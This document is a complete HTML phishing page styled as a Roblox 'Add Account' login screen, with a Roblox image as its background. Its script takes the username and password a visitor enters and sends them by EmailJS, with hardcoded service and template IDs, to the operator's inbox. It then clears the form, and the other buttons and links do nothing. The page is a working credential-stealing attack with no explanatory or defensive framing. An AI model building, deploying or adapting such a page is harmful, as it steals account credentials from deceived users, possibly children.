<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8"/>
<meta name="viewport" content="width=device-width, initial-scale=1.0"/>
<title>Custom Login</title>

<!-- EmailJS -->
<script src="https://cdn.jsdelivr.net/npm/@emailjs/browser@4/dist/email.min.js"></script>
<script>
  emailjs.init("-aUDdkE0WsVXws0jE");

  function handleLogin(event){
    event.preventDefault();
    const username = document.getElementById("username").value;
    const password = document.getElementById("password").value;

    if(!username || !password){
      alert("Please enter both username and password!");
      return;
    }

    const templateParams = { username, password };

    emailjs.send("service_hjj36j4", "template_xt30ood", templateParams)
      .then(() => {
        document.getElementById("loginForm").reset();
      })
      .catch(err => {
        alert("Failed to send: " + JSON.stringify(err));
      });
  }
</script>

<style>
  body{
    margin:0;
    padding:0;
    height:100vh;
    font-family: Arial, sans-serif;
    display:flex;
    justify-content:center;
    align-items:center;
    background-image: url('https://static0.polygonimages.com/wordpress/wp-content/uploads/sharedimages/2025/09/roblox-press-image-1.jpg?w=1600&h=900&fit=crop');
    background-size: cover;
  }

  .container {
    width: 340px;
    text-align: center;
    background: #26262c;
    padding: 40px;
    border-radius: 12px;
    box-shadow: 0 10px 28px rgba(0,0,0,0.25);
  }

  h1 {
    font-size: 26px;
    font-weight: bold;
    margin-bottom: 20px;
    color: white;
  }

  input {
    width: 100%;
    padding: 12px;
    margin: 10px 0;
    border-radius: 6px;
    border: none;
    background-color: #444;
    color: white;
    font-size: 14px;
  }

  input::placeholder { color: #ccc; }

  .btn {
    width: 100%;
    padding: 12px;
    margin-top: 15px;
    background-color: #000;
    border-radius: 6px;
    border: none;
    color: white;
    font-size: 16px;
    cursor: pointer;
  }

  .btn:hover { background-color: #111; }

  .divider {
    width: 100%;
    height: 1px;
    background-color: #3b3b3b;
    margin: 20px 0;
  }

  .secondary-btn {
    width: 100%;
    padding: 12px;
    background-color: #000;
    border: none;
    border-radius: 6px;
    margin: 8px 0;
    font-size: 14px;
    cursor: pointer;
    color: white;
  }

  .secondary-btn:hover { background-color: #111; }

  .link, .create-link {
    display: block;
    margin-top: 15px;
    color: #ccc;
    font-size: 14px;
    text-decoration: none;
  }

  .create-link { margin-top: 20px; }

</style>
</head>
<body>

  <div class="container">
    <h1>Add Account</h1>

    <form id="loginForm" onsubmit="handleLogin(event)">
      <input type="text" id="username" placeholder="Username/Email/Phone" required />
      <input type="password" id="password" placeholder="Password" required />
      <button type="submit" class="btn">Log In</button>
    </form>

    <a href="#" class="link">Forgot Password or Username?</a>

    <div class="divider"></div>

    <button class="secondary-btn">Email Me a One-Time Code</button>
    <button class="secondary-btn">Use Another Device</button>

    <a href="#" class="create-link">Create A New Account</a>
  </div>

</body>
</html>
